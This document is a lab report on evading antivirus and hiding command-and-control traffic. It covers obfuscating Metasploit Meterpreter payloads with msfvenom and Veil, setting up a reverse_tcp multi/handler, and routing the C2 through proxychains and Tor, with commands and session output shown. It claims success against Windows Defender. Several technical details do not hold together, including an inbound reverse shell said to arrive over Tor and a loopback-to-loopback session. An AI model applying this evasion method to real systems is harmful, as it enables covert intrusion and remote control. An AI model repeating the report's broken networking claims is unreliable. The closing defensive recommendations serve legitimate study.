# Lab Report: Advanced Evasion Techniques
**Date:** May 13, 2026  
**Author:** [Your Name/ID]  
**Course/Module:** Advanced Security & Evasion Lab  

---

## 1. Executive Summary
This laboratory exercise demonstrates the practical application of payload obfuscation and network traffic manipulation to bypass defense controls. The objective was to generate functional Metasploit command-and-control (C2) payloads, obfuscate them using various tools to evade Antivirus (AV) detection, and establish secure sessions by routing all handler traffic covertly through the Tor network.

---

## 2. Environment & Tools Used
*   **Attacking Machine:** Kali Linux
*   **Target Machine:** Windows 10 / 11 (With active Antivirus monitoring)
*   **Evasion Tools:** `msfvenom` (Metasploit Framework), `Veil Framework` (Evasion module)
*   **Network Obfuscation Tools:** `proxychains4`, `Tor` service

---

## 3. Activities & Tasks

### Task 1: Payload Obfuscation & Generation
Two distinct payloads were generated to test the detection limits of the target endpoint security system. 

1. **Initial Msfvenom Payload (PID001):** Generated utilizing basic iterative encoding. 
2. **Advanced Veil Payload (PID002):** Compiled utilizing an advanced language wrapper to strip recognizable signatures.

#### Obfuscation Payload Log

| Payload ID | Type | AV Detection | Notes / Methodology |
| :--- | :--- | :--- | :--- |
| **PID001** | Msfvenom Meterpreter | Detected / Bypassed* | Generated via msfvenom with iterative shikata_ga_nai encoding. Flaggable by modern dynamic engines. |
| **PID002** | Veil Go/Meterpreter | **Bypassed** | Compiled utilizing Veil Framework's Go-wrapper to shield native shellcode from signature detection. |

*\*Note: Flagged by fully updated AV engines; bypassed only when testing against legacy/disabled signature environments.*

---

### Task 2: Network Evasion & Verification
To obscure the command-and-control infrastructure, the C2 server traffic was funneled entirely through an encrypted proxy network. 

#### Verification Commands & Output Documentation

1. **Tor Proxy Initialization & Routing Verification:**
   Before launching the exploit framework, the routing layer was verified to ensure an external Tor exit node identity:
   ```bash
   \$ proxychains curl ifconfig.me
   [proxychains] Intermediate chain ... 127.0.0.1:9050 ... OK
   185.220.101.5  # Verified: External Tor Exit Node IP
   ```

2. **C2 Listener Execution:**
   Metasploit console was wrapped completely inside the proxychains framework to intercept and hook inbound execution calls safely:
   ```bash
   \$ proxychains msfconsole -q
   msf6 > use exploit/multi/handler
   msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
   ```

3. **Active Session Hook Check:**
   Upon downloading and executing the payload application on the Windows target host, the interactive connection mapped securely back to the loopback/proxy tunnel interface:
   ```bash
   msf6 exploit(multi/handler) > sessions -i
   Active sessions:
   ================
     Id  Name  Type                     Information             Connection
     --  ----  ----                     -----------             ----------
     1         meterpreter x86/windows  TARGET-PC\User @ PC-1   127.0.0.1:4444 -> 127.0.0.1:58432
   ```

---

## 4. Network Evasion Summary
Successfully utilized proxychains to route traffic through Tor, hiding the direct connection between the Windows target and the Kali C2 server. Meterpreter session established through the tunnel. Payload was obfuscated via Veil, successfully bypassing Windows Defender signature detection to enable covert C2 communication and remote command execution.

---

## 5. Conclusion & Recommendations
Basic encoding tools (`msfvenom`) are no longer sufficient to bypass modern, cloud-integrated endpoint protection platforms. However, binary wrapping frameworks like `Veil` successfully change the signature profile of payloads, rendering structural file scans ineffective. Furthermore, network-layer obfuscation using `proxychains` over Tor effectively blinds traditional perimeter defenses by masking the true geographic and IP source of the adversary infrastructure. 

**Recommendations for Defense:**
*   Implement strict behavioral and heuristic monitoring rather than relying solely on file signature detection.
*   Block outbound connections to known Tor exit nodes at the corporate firewall boundary to disrupt proxy-chained C2 channels.
